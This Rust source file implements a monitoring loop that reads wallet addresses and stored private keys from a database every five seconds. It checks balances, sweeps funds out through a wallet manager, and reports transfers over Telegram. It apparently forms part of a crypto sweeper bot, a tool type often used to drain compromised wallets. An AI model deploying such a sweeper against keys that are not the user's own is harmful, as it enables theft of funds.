use crate::config::Config;
use crate::database::ops::DatabaseOps;
use crate::telegram::alerts::TelegramAlerts;
use crate::wallet::manager::WalletManager;
use std::sync::Arc;
use std::time::Duration;
use tokio::time::sleep;
use tracing::{info, warn};

pub struct RealtimeMonitor {
    config: Arc<Config>,
    db_ops: Arc<DatabaseOps>,
    telegram: Arc<TelegramAlerts>,
    wallet_manager: Arc<WalletManager>,
}

impl RealtimeMonitor {
    pub fn new(
        config: Arc<Config>,
        db_ops: Arc<DatabaseOps>,
        telegram: Arc<TelegramAlerts>,
        wallet_manager: Arc<WalletManager>,
    ) -> Arc<Self> {
        Arc::new(Self {
            config,
            db_ops,
            telegram,
            wallet_manager,
        })
    }
    
    // Main monitor loop
    pub async fn run(self: Arc<Self>) {
        info!("🔄 Realtime monitor started");
        
        loop {
            match self.check_all_wallets().await {
                Ok(count) => {
                    if count > 0 {
                        info!("✅ Checked {} wallets", count);
                    }
                }
                Err(e) => {
                    warn!("❌ Monitor error: {}", e);
                }
            }
            
            // Check every 5 seconds
            sleep(Duration::from_secs(5)).await;
        }
    }
    
    // Check all monitored wallets
    async fn check_all_wallets(&self) -> Result<usize, Box<dyn std::error::Error>> {
        // Get all monitoring wallets from database
        let wallets = self.db_ops.get_monitoring_wallets().await?;
        
        if wallets.is_empty() {
            return Ok(0);
        }
        
        let mut checked_count = 0;
        
        // Check each wallet balance
        for wallet in wallets {
            let address = wallet.address.clone();
            let private_key = wallet.private_key.clone();
            
            // Process private key (balance check + transfer if needed)
            match self.wallet_manager.process_private_key(&private_key).await {
                Ok((wallet_info, transfer_result)) => {
                    checked_count += 1;
                    
                    // Update last checked
                    let _ = self.db_ops.update_last_checked(
                        &address,
                        &wallet_info.balance,
                    ).await;
                    
                    // If transfer happened
                    if let Some(transfer) = transfer_result {
                        if transfer.success {
                            // Send alert
                            self.telegram.send_transfer_success(
                                &wallet_info,
                                &transfer,
                            ).await;
                            
                            // Update database
                            let _ = self.db_ops.update_wallet_after_sweep(
                                &address,
                                &transfer.tx_hash,
                                &transfer.amount,
                            ).await;
                        } else {
                            // Send failure alert
                            if let Some(error) = &transfer.error {
                                self.telegram.send_transfer_failed(
                                    &wallet_info,
                                    error,
                                ).await;
                            }
                        }
                    }
                }
                Err(e) => {
                    warn!("❌ Failed to process wallet {}: {}", address, e);
                }
            }
        }
        
        Ok(checked_count)
    }
}